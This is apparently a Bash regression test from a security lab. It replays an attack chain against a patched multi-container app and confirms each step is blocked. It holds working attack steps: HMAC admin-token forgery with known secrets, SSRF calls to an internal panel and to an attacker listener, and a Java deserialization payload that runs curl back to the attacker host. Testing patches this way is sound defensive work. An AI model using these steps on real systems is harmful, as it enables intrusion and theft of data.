#!/usr/bin/env bash
# Segunda metade da prova de rede: a mesma cadeia contra a versão corrigida.
# Chamado pelo provar.sh, que já exportou os segredos do laboratório e compilou
# o projeto. Uso: bash infra/rede/provar-corrigido.sh <diretório de trabalho>
set -euo pipefail
cd "$(dirname "$0")/../.."

TRABALHO=$1
CORRIGIDO=(docker compose -p brecha-corrigido -f docker-compose.yml -f docker-compose.corrigido.yml)
falhas=0
conferir() { if [ "$1" = 0 ]; then echo "ok     $2"; else echo "FALHOU $2"; falhas=$((falhas + 1)); fi; }
verificar() { local d=$1; shift; if "$@"; then conferir 0 "$d"; else conferir 1 "$d"; fi; }

# Segredos em arquivo, novos, diferentes dos do laboratório. Legíveis pelo
# usuário sem root de cada contêiner, e só por quem tem acesso a esta pasta.
SEGREDOS_DIR="$TRABALHO/segredos"
mkdir -p "$SEGREDOS_DIR"
for nome in brecha_segredo django_secret_key relatorios_token pgpassword painel_token; do
  openssl rand -hex 32 > "$SEGREDOS_DIR/$nome"
done
openssl rand -hex 32 > "$SEGREDOS_DIR/comprovantes_cifra"
openssl rand -hex 32 > "$SEGREDOS_DIR/comprovantes_assinatura"
chmod 644 "$SEGREDOS_DIR"/*
export SEGREDOS_DIR

echo "Versão corrigida"
"${CORRIGIDO[@]}" up -d --build --wait --wait-timeout 300

WAF=http://127.0.0.1:8080
nao_publicado() { [ -z "$(docker port "$("${CORRIGIDO[@]}" ps -q "$1")" 2>/dev/null)" ]; }
verificar "a API não tem porta publicada; só o WAF chega nela" nao_publicado api 8080

entrar() {
  curl -sS -X POST "$WAF/$1/sessoes" -H 'Content-Type: application/json' \
    -d '{"email":"ana@exemplo.com.br","senha":"ana-senha-2026"}' | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])'
}
ana_v1=$(entrar v1)
ana_v2=$(entrar v2)
verificar "pelo WAF, o login normal funciona (controle)" [ -n "$ana_v2" ]

forjar() {
  SEGREDO="$1" python3 - <<'PY'
import base64, hashlib, hmac, os, time
conteudo = base64.urlsafe_b64encode(f"3:ADMIN:{int(time.time()) + 600}".encode()).rstrip(b"=")
assinatura = base64.urlsafe_b64encode(hmac.new(os.environ["SEGREDO"].encode(), conteudo, hashlib.sha256).digest()).rstrip(b"=")
print((conteudo + b"." + assinatura).decode())
PY
}
status_admin() { curl -s -o /dev/null -w '%{http_code}' "$WAF/v2/admin/clientes" -H "Authorization: Bearer $1"; }
verificar "token forjado com o segredo padrão do repositório é recusado" \
  [ "$(status_admin "$(forjar laboratorio-local-segredo-com-mais-de-32-bytes)")" = 401 ]
verificar "token forjado com o segredo do laboratório é recusado" [ "$(status_admin "$(forjar "$BRECHA_SEGREDO")")" = 401 ]

sem_segredo_no_ambiente() {
  for servico in api relatorios comprovantes notificacao banco painel; do
    if docker inspect "$("${CORRIGIDO[@]}" ps -q "$servico")" --format '{{range .Config.Env}}{{println .}}{{end}}' \
      | grep -Eq '^(BRECHA_SEGREDO|PGPASSWORD|POSTGRES_PASSWORD|DJANGO_SECRET_KEY|RELATORIOS_TOKEN_DE_SERVICO|COMPROVANTES_CHAVE_[A-Z]+)='; then
      echo "       segredo em variável de ambiente: $servico"
      return 1
    fi
  done
}
verificar "nenhum contêiner tem segredo em variável de ambiente" sem_segredo_no_ambiente

importar() {
  curl -sS -X POST "$WAF/v1/comprovantes/importar" -H "Authorization: Bearer $ana_v1" \
    -H 'Content-Type: application/json' -d "{\"url\":\"$1\"}" -w '\n%{http_code}'
}
painel=$(importar http://painel:8080/config)
painel_fechado() {
  echo "$painel" | grep -Eq '"status":40[14]|^403$' && ! echo "$painel" | grep -q "$(cat "$SEGREDOS_DIR/pgpassword")"
}
verificar "pelo SSRF, o painel pede token e não tem mais /config" painel_fechado

gateway=$(docker network inspect bridge -f '{{(index .IPAM.Config 0).Gateway}}')
python3 infra/rede/atacante.py 9100 /dev/null "$TRABALHO/coleta-corrigido.txt" & ATACANTE=$!
sleep 1
saida=$(importar "http://$gateway:9100/chisel")
kill "$ATACANTE" 2>/dev/null || true
sem_saida() { ! echo "$saida" | grep -q '"status":'; }
verificar "a API não alcança a máquina do atacante (rede interna sem saída)" sem_saida

payload=$(java -cp target/classes infra/rede/GerarPayload.java bash -c "curl http://$gateway:9100/coleta")
status=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$WAF/v1/agendamentos" -H "Authorization: Bearer $ana_v1" \
  -H 'Content-Type: application/json' -d "{\"agendamento\":\"$payload\"}")
verificar "o WAF barra o objeto Java serializado (status $status)" [ "$status" = 403 ]

"${CORRIGIDO[@]}" down -v --remove-orphans >/dev/null 2>&1 || true
[ "$falhas" = 0 ]
